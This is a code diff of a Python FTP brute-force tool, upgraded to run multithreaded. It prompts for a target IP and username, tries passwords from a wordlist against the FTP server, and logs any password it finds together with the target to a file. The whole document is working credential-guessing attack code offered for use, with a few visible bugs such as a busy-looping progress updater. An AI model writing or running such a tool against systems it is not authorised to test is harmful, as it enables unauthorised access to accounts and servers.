@@ -1,27 +1,77 @@
 import ftplib
+import threading
 from utils.colors import color_text
+from tqdm import tqdm
+from queue import Queue
+
+# Configurations
+MAX_THREADS = 10
+success_found = False
+lock = threading.Lock()
+q = Queue()
+
+def attempt_login(target_ip, username):
+    global success_found
+    while not q.empty() and not success_found:
+        password = q.get()
+        try:
+            with ftplib.FTP() as ftp:
+                ftp.connect(target_ip, 21, timeout=5)
+                ftp.login(user=username, passwd=password)
+                with lock:
+                    if not success_found:
+                        success_found = True
+                        print(color_text(f"\n[SUCCESS] Password found: {password}", "green"))
+                        with open("success_log.txt", "w") as log_file:
+                            log_file.write(f"Target: {target_ip}\nUsername: {username}\nPassword: {password}\n")
+        except:
+            pass
+        finally:
+            q.task_done()
 
 def run():
-    print(color_text("\n[+] Starting FTP Brute Force...\n", "cyan"))
-    
-    host = input("Enter FTP server IP address: ")
+    global success_found
+    print(color_text("[+] Starting Multithreaded FTP Brute Force...\n", "cyan"))
+
+    target_ip = input("Enter FTP server IP address: ")
     username = input("Enter username to test: ")
-    
+
     try:
-        with open("wordlist.txt", "r") as f:
-            for line in f:
-                password = line.strip()
-                try:
-                    ftp = ftplib.FTP(host, timeout=5)
-                    ftp.login(user=username, passwd=password)
-                    print(color_text(f"[SUCCESS] Password found: {password}", "green"))
-                    ftp.quit()
-                    return
-                except ftplib.error_perm:
-                    print(color_text(f"[-] Failed login: {password}", "red"))
-                except Exception as e:
-                    print(color_text(f"[!] Error: {e}", "red"))
-                    break
+        with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
+            passwords = f.read().splitlines()
     except FileNotFoundError:
-        print(color_text("[-] wordlist.txt not found!", "red"))
+        print(color_text("[-] wordlist.txt not found.", "red"))
+        return
+    except PermissionError:
+        print(color_text("[-] wordlist.txt is not writable or accessible.", "red"))
+        return
+
+    # Load passwords into queue
+    for pw in passwords:
+        q.put(pw)
+
+    # Show progress bar
+    pbar = tqdm(total=q.qsize(), desc="Brute Forcing", ncols=100)
+
+    def progress_updater():
+        while not q.empty() and not success_found:
+            pbar.update(1)
+
+    threading.Thread(target=progress_updater, daemon=True).start()
+
+    # Start threads
+    threads = []
+    for _ in range(MAX_THREADS):
+        t = threading.Thread(target=attempt_login, args=(target_ip, username))
+        t.start()
+        threads.append(t)
+
+    # Wait for all threads
+    for t in threads:
+        t.join()
+
+    pbar.close()
+
+    if not success_found:
+        print(color_text("\n[-] Password not found in wordlist.", "red"))
 
